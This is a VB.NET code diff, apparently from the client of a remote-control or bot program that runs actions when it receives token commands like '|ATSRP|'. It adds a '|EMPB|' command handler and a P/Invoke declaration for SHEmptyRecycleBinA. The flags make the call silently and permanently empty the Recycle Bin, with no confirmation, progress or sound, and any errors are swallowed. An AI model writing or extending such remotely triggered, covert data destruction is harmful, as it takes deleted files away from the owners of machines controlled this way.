@@ -73,6 +73,10 @@ Public Class MainCL
             ElseIf j(1) = "|ATSRP|" Then
                 Await Task.Run(Sub() ATSRP())
 
+
+            ElseIf j(1) = "|EMPB|" Then
+                Await Task.Run(Sub() EmptyBin())
+
             End If
 
         End If
@@ -81,6 +85,13 @@ Public Class MainCL
 
     End Sub
 
+    Public Shared Sub EmptyBin()
+        Try
+            SHEmptyRecycleBinA(0, "", 1 Or 2 Or 3)
+        Catch ex As Exception
+
+        End Try
+    End Sub
 
     Public Shared Sub SPRD()
 
@@ -340,7 +351,10 @@ Public Class MainCL
     End Sub
 
 
+    <DllImport("Shell32.dll")>
+    Public Shared Function SHEmptyRecycleBinA(ByVal hWnd As IntPtr, pszRootPath As String, ByVal FLGs As Integer) As IntPtr
 
+    End Function
 
 
 
